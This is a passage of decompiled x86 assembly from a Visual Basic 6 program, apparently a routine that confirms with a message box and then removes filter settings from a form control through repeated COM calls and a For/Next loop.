008B5D36: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B5D3B: mov var_04, 0000001Ch
008B5D42: push 004412BCh
008B5D47: push 00000000h
008B5D49: push 00000007h
008B5D4B: mov eax, [ebp+08h]
008B5D4E: mov eax, [eax]
008B5D50: push [ebp+08h]
008B5D53: call [eax+0000031Ch]
008B5D59: push eax
008B5D5A: lea eax, var_64
008B5D5D: push eax
008B5D5E: call 00410A84h ; Set (object)
008B5D63: push eax
008B5D64: lea eax, var_000000A0
008B5D6A: push eax
008B5D6B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B5D70: add esp, 00000010h
008B5D73: push eax
008B5D74: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B5D79: push eax
008B5D7A: lea eax, var_68
008B5D7D: push eax
008B5D7E: call 00410A84h ; Set (object)
008B5D83: mov var_0000017C, eax
008B5D89: mov var_000000C8, 80020004h
008B5D93: mov var_000000D0, 0000000Ah
008B5D9D: mov var_000000B8, 80020004h
008B5DA7: mov var_000000C0, 0000000Ah
008B5DB1: lea eax, var_34
008B5DB4: mov var_00000128, eax
008B5DBA: mov var_00000130, 00004008h
008B5DC4: lea eax, var_44
008B5DC7: mov var_00000118, eax
008B5DCD: mov var_00000120, 00004008h
008B5DD7: mov var_000000A8, 80020004h
008B5DE1: mov var_000000B0, 0000000Ah
008B5DEB: lea eax, var_6C
008B5DEE: push eax
008B5DEF: lea eax, var_000000D0
008B5DF5: push eax
008B5DF6: lea eax, var_000000C0
008B5DFC: push eax
008B5DFD: lea eax, var_00000130
008B5E03: push eax
008B5E04: lea eax, var_00000120
008B5E0A: push eax
008B5E0B: lea eax, var_000000B0
008B5E11: push eax
008B5E12: mov eax, var_0000017C
008B5E18: mov eax, [eax]
008B5E1A: push var_0000017C
008B5E20: call [eax+28h]
008B5E23: fclex 
008B5E25: mov var_00000180, eax
008B5E2B: cmp var_00000180, 00000000h
008B5E32: jnl 8B5E54h
008B5E34: push 00000028h
008B5E36: push 004412BCh
008B5E3B: push var_0000017C
008B5E41: push var_00000180
008B5E47: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5E4C: mov var_0000024C, eax
008B5E52: jmp 8B5E5Bh
008B5E54: and var_0000024C, 00000000h
008B5E5B: lea eax, var_6C
008B5E5E: push eax
008B5E5F: lea eax, var_68
008B5E62: push eax
008B5E63: lea eax, var_64
008B5E66: push eax
008B5E67: push 00000003h
008B5E69: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B5E6E: add esp, 00000010h
008B5E71: lea eax, var_000000D0
008B5E77: push eax
008B5E78: lea eax, var_000000C0
008B5E7E: push eax
008B5E7F: lea eax, var_000000B0
008B5E85: push eax
008B5E86: lea eax, var_000000A0
008B5E8C: push eax
008B5E8D: push 00000004h
008B5E8F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B5E94: add esp, 00000014h
008B5E97: mov var_04, 0000001Dh
008B5E9E: push 004412BCh
008B5EA3: push 00000000h
008B5EA5: push 00000007h
008B5EA7: mov eax, [ebp+08h]
008B5EAA: mov eax, [eax]
008B5EAC: push [ebp+08h]
008B5EAF: call [eax+0000031Ch]
008B5EB5: push eax
008B5EB6: lea eax, var_64
008B5EB9: push eax
008B5EBA: call 00410A84h ; Set (object)
008B5EBF: push eax
008B5EC0: lea eax, var_000000A0
008B5EC6: push eax
008B5EC7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B5ECC: add esp, 00000010h
008B5ECF: push eax
008B5ED0: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B5ED5: push eax
008B5ED6: lea eax, var_68
008B5ED9: push eax
008B5EDA: call 00410A84h ; Set (object)
008B5EDF: mov var_0000017C, eax
008B5EE5: lea eax, var_44
008B5EE8: mov var_00000108, eax
008B5EEE: mov var_00000110, 00004008h
008B5EF8: lea eax, var_6C
008B5EFB: push eax
008B5EFC: lea eax, var_00000110
008B5F02: push eax
008B5F03: mov eax, var_0000017C
008B5F09: mov eax, [eax]
008B5F0B: push var_0000017C
008B5F11: call [eax+24h]
008B5F14: fclex 
008B5F16: mov var_00000180, eax
008B5F1C: cmp var_00000180, 00000000h
008B5F23: jnl 8B5F45h
008B5F25: push 00000024h
008B5F27: push 004412BCh
008B5F2C: push var_0000017C
008B5F32: push var_00000180
008B5F38: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5F3D: mov var_00000250, eax
008B5F43: jmp 8B5F4Ch
008B5F45: and var_00000250, 00000000h
008B5F4C: mov eax, var_6C
008B5F4F: mov var_00000184, eax
008B5F55: push var_38
008B5F58: push 00000001h
008B5F5A: mov eax, var_00000184
008B5F60: mov eax, [eax]
008B5F62: push var_00000184
008B5F68: call [eax+00000088h]
008B5F6E: fclex 
008B5F70: mov var_00000188, eax
008B5F76: cmp var_00000188, 00000000h
008B5F7D: jnl 8B5FA2h
008B5F7F: push 00000088h
008B5F84: push 004412DCh
008B5F89: push var_00000184
008B5F8F: push var_00000188
008B5F95: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5F9A: mov var_00000254, eax
008B5FA0: jmp 8B5FA9h
008B5FA2: and var_00000254, 00000000h
008B5FA9: lea eax, var_6C
008B5FAC: push eax
008B5FAD: lea eax, var_68
008B5FB0: push eax
008B5FB1: lea eax, var_64
008B5FB4: push eax
008B5FB5: push 00000003h
008B5FB7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B5FBC: add esp, 00000010h
008B5FBF: lea ecx, var_000000A0
008B5FC5: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B5FCA: mov var_04, 0000001Eh
008B5FD1: push 004412BCh
008B5FD6: push 00000000h
008B5FD8: push 00000007h
008B5FDA: mov eax, [ebp+08h]
008B5FDD: mov eax, [eax]
008B5FDF: push [ebp+08h]
008B5FE2: call [eax+0000031Ch]
008B5FE8: push eax
008B5FE9: lea eax, var_64
008B5FEC: push eax
008B5FED: call 00410A84h ; Set (object)
008B5FF2: push eax
008B5FF3: lea eax, var_000000A0
008B5FF9: push eax
008B5FFA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B5FFF: add esp, 00000010h
008B6002: push eax
008B6003: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6008: push eax
008B6009: lea eax, var_68
008B600C: push eax
008B600D: call 00410A84h ; Set (object)
008B6012: mov var_0000017C, eax
008B6018: lea eax, var_44
008B601B: mov var_00000108, eax
008B6021: mov var_00000110, 00004008h
008B602B: lea eax, var_6C
008B602E: push eax
008B602F: lea eax, var_00000110
008B6035: push eax
008B6036: mov eax, var_0000017C
008B603C: mov eax, [eax]
008B603E: push var_0000017C
008B6044: call [eax+24h]
008B6047: fclex 
008B6049: mov var_00000180, eax
008B604F: cmp var_00000180, 00000000h
008B6056: jnl 8B6078h
008B6058: push 00000024h
008B605A: push 004412BCh
008B605F: push var_0000017C
008B6065: push var_00000180
008B606B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B6070: mov var_00000258, eax
008B6076: jmp 8B607Fh
008B6078: and var_00000258, 00000000h
008B607F: mov eax, var_6C
008B6082: mov var_00000184, eax
008B6088: push var_3C
008B608B: push 00000002h
008B608D: mov eax, var_00000184
008B6093: mov eax, [eax]
008B6095: push var_00000184
008B609B: call [eax+00000088h]
008B60A1: fclex 
008B60A3: mov var_00000188, eax
008B60A9: cmp var_00000188, 00000000h
008B60B0: jnl 8B60D5h
008B60B2: push 00000088h
008B60B7: push 004412DCh
008B60BC: push var_00000184
008B60C2: push var_00000188
008B60C8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B60CD: mov var_0000025C, eax
008B60D3: jmp 8B60DCh
008B60D5: and var_0000025C, 00000000h
008B60DC: lea eax, var_6C
008B60DF: push eax
008B60E0: lea eax, var_68
008B60E3: push eax
008B60E4: lea eax, var_64
008B60E7: push eax
008B60E8: push 00000003h
008B60EA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B60EF: add esp, 00000010h
008B60F2: lea ecx, var_000000A0
008B60F8: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B60FD: mov var_04, 0000001Fh
008B6104: push 004412BCh
008B6109: push 00000000h
008B610B: push 00000007h
008B610D: mov eax, [ebp+08h]
008B6110: mov eax, [eax]
008B6112: push [ebp+08h]
008B6115: call [eax+0000031Ch]
008B611B: push eax
008B611C: lea eax, var_64
008B611F: push eax
008B6120: call 00410A84h ; Set (object)
008B6125: push eax
008B6126: lea eax, var_000000A0
008B612C: push eax
008B612D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6132: add esp, 00000010h
008B6135: push eax
008B6136: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B613B: push eax
008B613C: lea eax, var_68
008B613F: push eax
008B6140: call 00410A84h ; Set (object)
008B6145: mov var_0000017C, eax
008B614B: lea eax, var_44
008B614E: mov var_00000108, eax
008B6154: mov var_00000110, 00004008h
008B615E: lea eax, var_6C
008B6161: push eax
008B6162: lea eax, var_00000110
008B6168: push eax
008B6169: mov eax, var_0000017C
008B616F: mov eax, [eax]
008B6171: push var_0000017C
008B6177: call [eax+24h]
008B617A: fclex 
008B617C: mov var_00000180, eax
008B6182: cmp var_00000180, 00000000h
008B6189: jnl 8B61ABh
008B618B: push 00000024h
008B618D: push 004412BCh
008B6192: push var_0000017C
008B6198: push var_00000180
008B619E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B61A3: mov var_00000260, eax
008B61A9: jmp 8B61B2h
008B61AB: and var_00000260, 00000000h
008B61B2: mov eax, var_6C
008B61B5: mov var_00000184, eax
008B61BB: push var_40
008B61BE: push 00000003h
008B61C0: mov eax, var_00000184
008B61C6: mov eax, [eax]
008B61C8: push var_00000184
008B61CE: call [eax+00000088h]
008B61D4: fclex 
008B61D6: mov var_00000188, eax
008B61DC: cmp var_00000188, 00000000h
008B61E3: jnl 8B6208h
008B61E5: push 00000088h
008B61EA: push 004412DCh
008B61EF: push var_00000184
008B61F5: push var_00000188
008B61FB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B6200: mov var_00000264, eax
008B6206: jmp 8B620Fh
008B6208: and var_00000264, 00000000h
008B620F: lea eax, var_6C
008B6212: push eax
008B6213: lea eax, var_68
008B6216: push eax
008B6217: lea eax, var_64
008B621A: push eax
008B621B: push 00000003h
008B621D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B6222: add esp, 00000010h
008B6225: lea ecx, var_000000A0
008B622B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B6230: jmp 008B674Dh
008B6235: mov var_04, 00000021h
008B623C: push 004412DCh
008B6241: push 00000000h
008B6243: push 0000000Dh
008B6245: mov eax, [ebp+08h]
008B6248: mov eax, [eax]
008B624A: push [ebp+08h]
008B624D: call [eax+0000031Ch]
008B6253: push eax
008B6254: lea eax, var_64
008B6257: push eax
008B6258: call 00410A84h ; Set (object)
008B625D: push eax
008B625E: lea eax, var_000000A0
008B6264: push eax
008B6265: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B626A: add esp, 00000010h
008B626D: push eax
008B626E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6273: push eax
008B6274: lea eax, var_68
008B6277: push eax
008B6278: call 00410A84h ; Set (object)
008B627D: mov var_0000017C, eax
008B6283: lea eax, var_00000178
008B6289: push eax
008B628A: mov eax, var_0000017C
008B6290: mov eax, [eax]
008B6292: push var_0000017C
008B6298: call [eax+44h]
008B629B: fclex 
008B629D: mov var_00000180, eax
008B62A3: cmp var_00000180, 00000000h
008B62AA: jnl 8B62CCh
008B62AC: push 00000044h
008B62AE: push 004412DCh
008B62B3: push var_0000017C
008B62B9: push var_00000180
008B62BF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B62C4: mov var_00000268, eax
008B62CA: jmp 8B62D3h
008B62CC: and var_00000268, 00000000h
008B62D3: push var_00000178
008B62D9: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
008B62DE: mov edx, eax
008B62E0: lea ecx, var_34
008B62E3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B62E8: lea eax, var_68
008B62EB: push eax
008B62EC: lea eax, var_64
008B62EF: push eax
008B62F0: push 00000002h
008B62F2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B62F7: add esp, 0000000Ch
008B62FA: lea ecx, var_000000A0
008B6300: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B6305: mov var_04, 00000022h
008B630C: push var_34
008B630F: push 00000000h
008B6311: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B6316: test eax, eax
008B6318: jnz 8B631Fh
008B631A: jmp 008B674Dh
008B631F: mov var_04, 00000025h
008B6326: mov var_000000C8, 80020004h
008B6330: mov var_000000D0, 0000000Ah
008B633A: mov var_000000B8, 80020004h
008B6344: mov var_000000C0, 0000000Ah
008B634E: mov var_000000A8, 80020004h
008B6358: mov var_000000B0, 0000000Ah
008B6362: mov var_00000108, 0045A474h ; Do you really want to remove the filter(s)?
008B636C: mov var_00000110, 00000008h
008B6376: lea edx, var_00000110
008B637C: lea ecx, var_000000A0
008B6382: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B6387: lea eax, var_000000D0
008B638D: push eax
008B638E: lea eax, var_000000C0
008B6394: push eax
008B6395: lea eax, var_000000B0
008B639B: push eax
008B639C: push 00000034h
008B639E: lea eax, var_000000A0
008B63A4: push eax
008B63A5: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
008B63AA: sub eax, 00000007h
008B63AD: neg eax
008B63AF: sbb eax, eax
008B63B1: inc eax
008B63B2: neg eax
008B63B4: mov var_0000017C, ax
008B63BB: lea eax, var_000000D0
008B63C1: push eax
008B63C2: lea eax, var_000000C0
008B63C8: push eax
008B63C9: lea eax, var_000000B0
008B63CF: push eax
008B63D0: lea eax, var_000000A0
008B63D6: push eax
008B63D7: push 00000004h
008B63D9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B63DE: add esp, 00000014h
008B63E1: movsx eax, word ptr var_0000017C
008B63E8: test eax, eax
008B63EA: jz 8B63F1h
008B63EC: jmp 008B674Dh
008B63F1: mov var_04, 00000029h
008B63F8: mov var_00000108, 00000001h
008B6402: mov var_00000110, 00000002h
008B640C: push 004412BCh
008B6411: push 00000000h
008B6413: push 00000007h
008B6415: mov eax, [ebp+08h]
008B6418: mov eax, [eax]
008B641A: push [ebp+08h]
008B641D: call [eax+0000031Ch]
008B6423: push eax
008B6424: lea eax, var_64
008B6427: push eax
008B6428: call 00410A84h ; Set (object)
008B642D: push eax
008B642E: lea eax, var_000000A0
008B6434: push eax
008B6435: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B643A: add esp, 00000010h
008B643D: push eax
008B643E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6443: push eax
008B6444: lea eax, var_68
008B6447: push eax
008B6448: call 00410A84h ; Set (object)
008B644D: mov var_0000017C, eax
008B6453: lea eax, var_00000178
008B6459: push eax
008B645A: mov eax, var_0000017C
008B6460: mov eax, [eax]
008B6462: push var_0000017C
008B6468: call [eax+1Ch]
008B646B: fclex 
008B646D: mov var_00000180, eax
008B6473: cmp var_00000180, 00000000h
008B647A: jnl 8B649Ch
008B647C: push 0000001Ch
008B647E: push 004412BCh
008B6483: push var_0000017C
008B6489: push var_00000180
008B648F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B6494: mov var_0000026C, eax
008B649A: jmp 8B64A3h
008B649C: and var_0000026C, 00000000h
008B64A3: mov eax, var_00000178
008B64A9: mov var_00000118, eax
008B64AF: mov var_00000120, 00000003h
008B64B9: mov var_00000128, 00000001h
008B64C3: mov var_00000130, 00000002h
008B64CD: lea eax, var_00000110
008B64D3: push eax
008B64D4: lea eax, var_00000120
008B64DA: push eax
008B64DB: lea eax, var_00000130
008B64E1: push eax
008B64E2: lea eax, var_000001FC
008B64E8: push eax
008B64E9: lea eax, var_000001EC
008B64EF: push eax
008B64F0: lea eax, var_30
008B64F3: push eax
008B64F4: call 00410A3Ch ; For
008B64F9: mov var_0000021C, eax
008B64FF: lea eax, var_68
008B6502: push eax
008B6503: lea eax, var_64
008B6506: push eax
008B6507: push 00000002h
008B6509: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B650E: add esp, 0000000Ch
008B6511: lea ecx, var_000000A0
008B6517: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B651C: jmp 008B6740h
008B6521: mov var_04, 0000002Ah
008B6528: push 004412BCh
008B652D: push 00000000h
008B652F: push 00000007h
008B6531: mov eax, [ebp+08h]
008B6534: mov eax, [eax]
008B6536: push [ebp+08h]
008B6539: call [eax+0000031Ch]
008B653F: push eax
008B6540: lea eax, var_64
008B6543: push eax
008B6544: call 00410A84h ; Set (object)
008B6549: push eax
008B654A: lea eax, var_000000A0
008B6550: push eax
008B6551: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6556: add esp, 00000010h
008B6559: push eax
008B655A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B655F: push eax
008B6560: lea eax, var_68
008B6563: push eax
008B6564: call 00410A84h ; Set (object)
008B6569: mov var_0000017C, eax
008B656F: lea eax, var_6C
008B6572: push eax
008B6573: lea eax, var_30
008B6576: push eax
008B6577: mov eax, var_0000017C
008B657D: mov eax, [eax]
008B657F: push var_0000017C
008B6585: call [eax+24h]
008B6588: fclex 
008B658A: mov var_00000180, eax
008B6590: cmp var_00000180, 00000000h
008B6597: jnl 8B65B9h
008B6599: push 00000024h
008B659B: push 004412BCh
008B65A0: push var_0000017C
008B65A6: push var_00000180
008B65AC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B65B1: mov var_00000270, eax
008B65B7: jmp 8B65C0h
008B65B9: and var_00000270, 00000000h
008B65C0: mov eax, var_6C
008B65C3: mov var_00000184, eax
008B65C9: lea eax, var_00000174
008B65CF: push eax
008B65D0: mov eax, var_00000184
008B65D6: mov eax, [eax]
008B65D8: push var_00000184
008B65DE: call [eax+5Ch]
008B65E1: fclex 
008B65E3: mov var_00000188, eax
008B65E9: cmp var_00000188, 00000000h
008B65F0: jnl 8B6612h
008B65F2: push 0000005Ch
008B65F4: push 004412DCh
008B65F9: push var_00000184
008B65FF: push var_00000188
008B6605: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B660A: mov var_00000274, eax
008B6610: jmp 8B6619h
008B6612: and var_00000274, 00000000h
008B6619: xor eax, eax
008B661B: cmp word ptr var_00000174, FFFFh
008B6623: setz al
008B6626: neg eax
008B6628: mov var_0000018C, ax
008B662F: lea eax, var_6C
008B6632: push eax
008B6633: lea eax, var_68
008B6636: push eax
008B6637: lea eax, var_64
008B663A: push eax
008B663B: push 00000003h
008B663D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B6642: add esp, 00000010h
008B6645: lea ecx, var_000000A0
008B664B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B6650: movsx eax, word ptr var_0000018C
008B6657: test eax, eax
008B6659: jz 008B671Ch
008B665F: mov var_04, 0000002Bh
008B6666: push 004412BCh
008B666B: push 00000000h
008B666D: push 00000007h
008B666F: mov eax, [ebp+08h]
008B6672: mov eax, [eax]
008B6674: push [ebp+08h]
008B6677: call [eax+0000031Ch]
008B667D: push eax
008B667E: lea eax, var_64
008B6681: push eax
008B6682: call 00410A84h ; Set (object)
008B6687: push eax
008B6688: lea eax, var_000000A0
008B668E: push eax
008B668F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6694: add esp, 00000010h
008B6697: push eax
008B6698: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B669D: push eax
008B669E: lea eax, var_68
008B66A1: push eax
008B66A2: call 00410A84h ; Set (object)
008B66A7: mov var_0000017C, eax
008B66AD: lea eax, var_30
008B66B0: push eax
008B66B1: mov eax, var_0000017C
008B66B7: mov eax, [eax]
008B66B9: push var_0000017C
008B66BF: call [eax+34h]
008B66C2: fclex 
008B66C4: mov var_00000180, eax
008B66CA: cmp var_00000180, 00000000h
008B66D1: jnl 8B66F3h
008B66D3: push 00000034h
008B66D5: push 004412BCh
008B66DA: push var_0000017C
008B66E0: push var_00000180
008B66E6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B66EB: mov var_00000278, eax
008B66F1: jmp 8B66FAh
008B66F3: and var_00000278, 00000000h
008B66FA: lea eax, var_68
008B66FD: push eax
008B66FE: lea eax, var_64
008B6701: push eax
008B6702: push 00000002h
008B6704: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B6709: add esp, 0000000Ch
008B670C: lea ecx, var_000000A0
008B6712: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B6717: jmp 008B63F1h
008B671C: mov var_04, 0000002Eh
008B6723: lea eax, var_000001FC
008B6729: push eax
008B672A: lea eax, var_000001EC
008B6730: push eax
008B6731: lea eax, var_30
008B6734: push eax
008B6735: call 00410A36h ; Next
008B673A: mov var_0000021C, eax
008B6740: cmp var_0000021C, 00000000h
008B6747: jnz 008B6521h
008B674D: mov var_10, 00000000h
008B6754: push 008B685Dh
008B6759: jmp 008B6806h
008B675E: lea eax, var_60
008B6761: push eax
008B6762: lea eax, var_5C
008B6765: push eax
008B6766: lea eax, var_58
008B6769: push eax
008B676A: lea eax, var_54
008B676D: push eax
008B676E: lea eax, var_50
008B6771: push eax
008B6772: lea eax, var_4C
008B6775: push eax
008B6776: lea eax, var_48
008B6779: push eax
008B677A: push 00000007h
008B677C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B6781: add esp, 00000020h
008B6784: lea eax, var_00000090
008B678A: push eax
008B678B: lea eax, var_0000008C
008B6791: push eax
008B6792: lea eax, var_00000088
008B6798: push eax
008B6799: lea eax, var_00000084
008B679F: push eax
008B67A0: lea eax, var_80
008B67A3: push eax
008B67A4: lea eax, var_7C
008B67A7: push eax
008B67A8: lea eax, var_78
008B67AB: push eax
008B67AC: lea eax, var_74
008B67AF: push eax
008B67B0: lea eax, var_70
008B67B3: push eax
008B67B4: lea eax, var_6C
008B67B7: push eax
008B67B8: lea eax, var_68
008B67BB: push eax
008B67BC: lea eax, var_64
008B67BF: push eax
008B67C0: push 0000000Ch
008B67C2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B67C7: add esp, 00000034h
008B67CA: lea eax, var_00000100
008B67D0: push eax
008B67D1: lea eax, var_000000F0
008B67D7: push eax
008B67D8: lea eax, var_000000E0
008B67DE: push eax
008B67DF: lea eax, var_000000D0
008B67E5: push eax
008B67E6: lea eax, var_000000C0
008B67EC: push eax
008B67ED: lea eax, var_000000B0
008B67F3: push eax
008B67F4: lea eax, var_000000A0
008B67FA: push eax
008B67FB: push 00000007h
008B67FD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B6802: add esp, 00000020h
008B6805: ret 
End Sub

